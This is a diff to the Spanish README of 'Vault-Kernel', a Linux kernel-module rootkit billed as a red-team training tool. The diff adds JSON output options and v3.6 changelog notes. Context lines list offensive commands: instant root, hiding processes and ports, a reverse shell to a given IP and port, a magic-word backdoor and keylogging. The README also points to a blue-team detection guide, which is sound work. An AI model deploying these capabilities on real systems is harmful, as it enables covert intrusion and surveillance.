@@ -5,7 +5,7 @@
 <div align="center">
 
 [![CI](https://github.com/Ruby570bocadito/Vault-Kernel/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/Ruby570bocadito/Vault-Kernel/actions/workflows/ci.yml)
-![Version](https://img.shields.io/badge/Version-3.5-8A2BE2?style=flat)
+![Version](https://img.shields.io/badge/Version-3.6-8A2BE2?style=flat)
 ![Language](https://img.shields.io/badge/Language-C-CC0000?style=flat&logo=c&logoColor=white)
 ![Client](https://img.shields.io/badge/Client-Go-00ADD8?style=flat&logo=go&logoColor=white)
 ![Platform](https://img.shields.io/badge/Platform-Linux%20x86__64-FF6600?style=flat&logo=linux&logoColor=white)
@@ -124,6 +124,7 @@ sudo ./vault_kernel stats
 ```bash
 vault_kernel status              # ¿Está cargado el módulo?
 vault_kernel doctor              # Diagnóstico completo del lab (dispositivo, ABI, hooks)
+vault_kernel doctor --json       # El mismo diagnóstico en JSON para scripts/jq
 vault_kernel stats               # Estadísticas en vivo (hooks, contadores, uptime)
 vault_kernel stats --json        # Las mismas estadísticas en JSON para scripting
 vault_kernel give-root [pid]     # Root instantáneo (por defecto: self)
@@ -134,6 +135,7 @@ vault_kernel unhide-pid <pid>    # Revelar proceso
 vault_kernel hide-port <port>    # Ocultar puerto TCP/UDP
 vault_kernel unhide-port <port>  # Revelar puerto
 vault_kernel list                # Listar todo lo oculto
+vault_kernel list --json         # Lo oculto en JSON ({pids, files, ports})
 vault_kernel shell <ip:port>     # Reverse shell vía usermodehelper
 vault_kernel magic <word>        # Activar backdoor de palabra mágica
 vault_kernel magic-encode <word> <port>  # Imprimir el kill() listo para disparar
@@ -259,24 +261,20 @@ Vault-Kernel/
 │   ├── DETECTION.md             # Guía de detección para blue teams
 │   ├── agentes/                 # Informes de ronda del equipo de agentes IA
 │   └── images/                  # Banner + demo GIF
-├── CHANGELOG.md                 # Historial detallado v3.0 → v3.4
-└── .github/workflows/ci.yml     # CI (6 jobs: Go, kernel runner, kernel matrix docker, shellcheck, payloads, python)
+├── CHANGELOG.md                 # Historial detallado v3.0 → v3.6
+└── .github/workflows/ci.yml     # CI (7 jobs: Go, kernel runner, kernel matrix docker 5.15/6.8, shellcheck, payloads, python+tests)
 ```
 
-### 🔄 Novedades v3.4
+### 🔄 Novedades v3.6
 
 Resumen de la ronda de mantenimiento — la lista completa está en
 [CHANGELOG.md](CHANGELOG.md):
 
-- **Ocultación de ficheros corregida de verdad**: `filter_dirents()` corrompía el buffer de `getdents`/`getdents64` salvo cuando la entrada oculta iba al final del lote — un fichero oculto en primera posición **seguía visible** y en el resto de posiciones truncaba o corrompía el listado. Verificado con arnés propio sobre buffers dirent sintéticos (6/6 casos).
-- **Sin desbordamiento de heap**: `IOCTL_LIST_HIDDEN` avanzaba el puntero de escritura más allá del buffer con `snprintf` truncado (underflow de `remaining`) — con ~16 ficheros ocultos de 255 chars se corrompía el heap del kernel. Ahora el reporte se trunca de forma segura.
-- **Canal de control cerrado a no-root**: abrir `/dev/vault_kernel` exige `CAP_SYS_ADMIN` dentro del propio módulo, aunque los permisos del nodo se aflojen (uci/reglas/contenedores).
-- **`read()` sin falsos positivos**: el filtro de puertos ya no se aplica a ficheros de usuario llamados `tcp`/`udp*`; solo a procfs real (check de `PROC_SUPER_MAGIC`).
-- **Nuevo comando `doctor`** (Go y Python): diagnóstico de lab — nodo, permisos, ABI, hooks, match de versión cliente/módulo, estado stealth e interfaces.
-- **`give-root` se verifica a sí mismo**: tras el ioctl, el CLI comprueba `euid=0` (self) o `/proc/<pid>/status` (remoto) y lo reporta.
-- **Guía defensiva**: [docs/DETECTION.md](docs/DETECTION.md) con IOC, comprobaciones en vivo, forense de memoria y endurecimiento para que el equipo azul también gane.
-- **Validación de entrada**: nombres >255 chars, palabras mágicas >15 chars y targets largos se rechazan en el CLI en vez de truncarse en silencio.
-- **Código muerto eliminado** y `make test` ejecuta ahora también la regresión de payloads.
+- **`stats --json` corregido**: el parser perdía 4 de las 10 claves del reporte (`version`, `hooks_planned`, `hidden_pids`, `hidden_ports`) porque el módulo emite varios pares `clave=valor` por línea. Ahora los dos CLIs comparten un parser por tokens con tests en CI (16 unittest Python + suite Go).
+- **`doctor` restaura su check de versión**: el aviso de desajuste cliente/módulo nunca podía dispararse por el mismo parser roto; la línea de hooks ya no se imprime mangleada.
+- **`keylog --follow --interval` en milisegundos reales**: el CLI Python dormía segundos (1000x más lento que el Go y que la documentación). Paridad Go/Python con suelo de 50 ms.
+- **Nuevos comandos `list --json` y `doctor --json`** (Go y Python): toda la superficie de lectura del CLI es consumible por scripts/jq con esquemas estables.
+- **La CI de Python ejecuta tests de verdad**: hasta v3.5 solo compilaba y linteaba; ahora corre la suite unittest stdlib en cada push.
 
 ---
 
@@ -312,5 +310,5 @@ Vault-Kernel is a Linux **LKM rootkit engine** for red team training and authori
 **License:** MIT — see [LICENSE](LICENSE). Built for learning; use it only where you have written permission.
 
 <div align="center">
-  <sub>Built with 🔥 by <a href="https://github.com/Ruby570bocadito">Ruby570bocadito</a> — Vault-Kernel v3.5</sub>
+  <sub>Built with 🔥 by <a href="https://github.com/Ruby570bocadito">Ruby570bocadito</a> — Vault-Kernel v3.6</sub>
 </div>
